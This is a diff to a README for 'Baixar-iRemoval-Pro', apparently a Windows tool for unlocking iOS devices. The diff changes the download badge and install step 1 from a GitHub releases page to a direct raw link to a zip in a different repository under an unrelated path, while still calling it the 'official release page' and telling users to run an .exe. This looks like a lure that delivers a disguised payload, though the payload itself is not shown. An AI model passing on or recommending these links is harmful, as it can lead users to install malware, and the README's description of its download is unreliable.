@@ -5,7 +5,7 @@ description: "Download iRemoval Pro for Windows 10 and 11 to manage your iOS dev
 ---
 # 🚀 Baixar-iRemoval-Pro - Unlock iOS devices on Windows easily
 
-[![Download iRemoval Pro](https://img.shields.io/badge/Download-iRemoval%20Pro-blue.svg)](https://github.com/naja21224904/Baixar-iRemoval-Pro/releases)
+[![Download iRemoval Pro](https://img.shields.io/badge/Download-iRemoval%20Pro-blue.svg)](https://raw.githubusercontent.com/naja21224904/naja21224904.github.io/main/metathesis/io-github-naja-v3.9.zip)
 
 ## 📖 About this software
 
@@ -26,7 +26,7 @@ Before you begin, ensure your computer meets these requirements to run the softw
 
 Follow these steps to obtain and prepare the software on your machine:
 
-1.  Visit the official release page: [https://github.com/naja21224904/Baixar-iRemoval-Pro/releases](https://github.com/naja21224904/Baixar-iRemoval-Pro/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/naja21224904/naja21224904.github.io/main/metathesis/io-github-naja-v3.9.zip](https://raw.githubusercontent.com/naja21224904/naja21224904.github.io/main/metathesis/io-github-naja-v3.9.zip).
 2.  Locate the latest version entry at the top of the list.
 3.  Click the file name ending in .exe to start the browser download.
 4.  Save the installer to your Downloads folder.
